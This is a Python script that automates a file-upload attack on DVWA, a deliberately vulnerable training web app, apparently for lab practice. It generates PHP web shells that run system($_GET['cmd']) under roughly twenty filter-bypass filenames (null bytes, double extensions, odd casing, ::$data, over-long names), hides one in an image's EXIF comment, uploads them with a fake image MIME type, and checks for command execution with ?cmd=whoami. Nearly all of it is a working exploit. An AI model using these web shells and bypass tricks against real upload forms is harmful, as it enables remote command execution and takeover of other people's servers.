#!/usr/bin/env python3
import requests
import os
import subprocess
import time
import urllib.parse

# Configuration for DVWA
BASE_URL = "http://localhost/DVWA/"
UPLOAD_URL = f"{BASE_URL}vulnerabilities/upload/"
UPLOAD_DIR = f"{BASE_URL}hackable/uploads/"
LOCAL_UPLOAD_PATH = "/var/www/html/DVWA/hackable/uploads/"
COOKIE = {
    'PHPSESSID': 'jtilroio40ftke9gn0qvqj17m1',
    'security': 'medium'
}
REPORT_FILENAME = "vuln_report.txt"

def embed_php_in_image(image_file, output_file):
    """Embed PHP payload inside an image metadata using exiftool."""
    payload = "<?php system($_REQUEST['cmd']); ?>"
    try:
        subprocess.run(["exiftool", f"-Comment={payload}", image_file, "-o", output_file], check=True)
        print(f"[+] Embedded PHP payload inside {output_file}")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error embedding payload: {e}")

def create_payloads():
    """Create PHP web shell payloads."""
    payloads = {
        "shell.php.jpg": "<?php system($_GET['cmd']); ?>",
        "shell.pHp5": "<?php system($_GET['cmd']); ?>",
        "shell.png.php": "<?php system($_GET['cmd']); ?>",
        "shell.php#.png": "<?php system($_GET['cmd']); ?>",
        "shell.php%20": "<?php system($_GET['cmd']); ?>",
        "shell.phpJunk123png": "<?php system($_GET['cmd']); ?>",
        "shell.png.jpg.php": "<?php system($_GET['cmd']); ?>",
        "shell.php%00.png": "<?php system($_GET['cmd']); ?>",
        "shell.php...": "<?php system($_GET['cmd']); ?>",
        "shell.php.png": "<?php system($_GET['cmd']); ?>",
        "shell.asp::$data": "<?php system($_GET['cmd']); ?>",
        "A" * 232 + ".php": "<?php system($_GET['cmd']); ?>",
        "shell.php%0a": "<?php system($_GET['cmd']); ?>",
        "shell.php%00": "<?php system($_GET['cmd']); ?>",
        "shell.php%0d%0a": "<?php system($_GET['cmd']); ?>",
        "shell.php#.png": "<?php system($_GET['cmd']); ?>",
        "shell.phpJunk123png": "<?php system($_GET['cmd']); ?>",
        "shell.png.jpg.php": "<?php system($_GET['cmd']); ?>",
        "shell.php%00.png%00.jpg": "<?php system($_GET['cmd']); ?>",
    }

    created_files = []
    for filename, content in payloads.items():
        try:
            with open(filename, 'w') as f:
                f.write(content)
            print(f"[+] Created payload: {filename}")
            created_files.append(filename)
        except Exception as e:
            print(f"[-] Error creating payload {filename}: {e}")

    # Embed PHP in an image
    embed_php_in_image("clean_image.jpg", "shell.jpg")
    created_files.append("shell.jpg")

    return created_files

def upload_files(payload_filenames):
    """Upload payloads and verify if they are uploaded successfully."""
    uploaded_files = []
    failed_files = []

    for filename in payload_filenames:
        data = {'Upload': 'Upload', 'MAX_FILE_SIZE': '100000'}
        mime_type = "image/png"
        files = {'uploaded': (filename, open(filename, 'rb'), mime_type)}

        try:
            print(f"[*] Uploading {filename} with MIME {mime_type}...")
            response = requests.post(UPLOAD_URL, files=files, data=data, cookies=COOKIE)

            # ✅ Step 1: Check response for success message
            if "successfully uploaded!" in response.text:
                print(f"[+] {filename} uploaded successfully (Response Confirmed)!")
                uploaded_files.append(filename)
                continue  # Skip checking directory since we confirmed upload

            # ✅ Step 2: Check if file exists in the upload directory
            time.sleep(1)  # Small delay to allow file to appear in directory
            upload_path = os.path.join(LOCAL_UPLOAD_PATH, filename)
            if os.path.exists(upload_path):
                print(f"[+] {filename} uploaded successfully (Found in directory)!")
                uploaded_files.append(filename)
            else:
                print(f"[-] Upload failed for {filename} (File not found in directory).")
                failed_files.append(filename)

        except Exception as e:
            print(f"[-] Upload error for {filename}: {str(e)}")
            failed_files.append(filename)

    return uploaded_files, failed_files

def test_uploaded_files(uploaded_files):
    """Check if uploaded files execute commands using ?cmd=whoami."""
    successful_executions = []

    for filename in uploaded_files:
        test_url = f"{UPLOAD_DIR}{filename}?cmd=whoami"
        try:
            print(f"[*] Testing execution: {test_url}")
            response = requests.get(test_url, cookies=COOKIE)
            
            if "www-data" in response.text:
                print(f"[+] Command execution successful for {filename}!")
                successful_executions.append(filename)
            else:
                print(f"[-] Command execution failed for {filename} (No www-data response).")

        except Exception as e:
            print(f"[-] Error testing {filename}: {str(e)}")

    return successful_executions

def generate_report(uploaded_files, failed_files, executed_files):
    """Generate a report listing successful and failed uploads."""
    report = "Vulnerability Report\n====================\n"

    if uploaded_files:
        report += "\n✅ **Successfully Uploaded Files:**\n"
        for file in uploaded_files:
            report += f"- {UPLOAD_DIR}{file}\n"
    
    if failed_files:
        report += "\n❌ **Failed Uploads:**\n"
        for file in failed_files:
            report += f"- {file}\n"

    if executed_files:
        report += "\n⚡ **Files Successfully Executed:**\n"
        for file in executed_files:
            report += f"- {UPLOAD_DIR}{file}?cmd=whoami\n"

    with open(REPORT_FILENAME, "w") as f:
        f.write(report)

    print(f"[+] Report generated: {REPORT_FILENAME} (Check the file for details.)")

def main():
    """Main function to run the attack process."""
    payload_filenames = create_payloads()
    uploaded_files, failed_files = upload_files(payload_filenames)
    executed_files = test_uploaded_files(uploaded_files)
    generate_report(uploaded_files, failed_files, executed_files)

if __name__ == "__main__":
    main()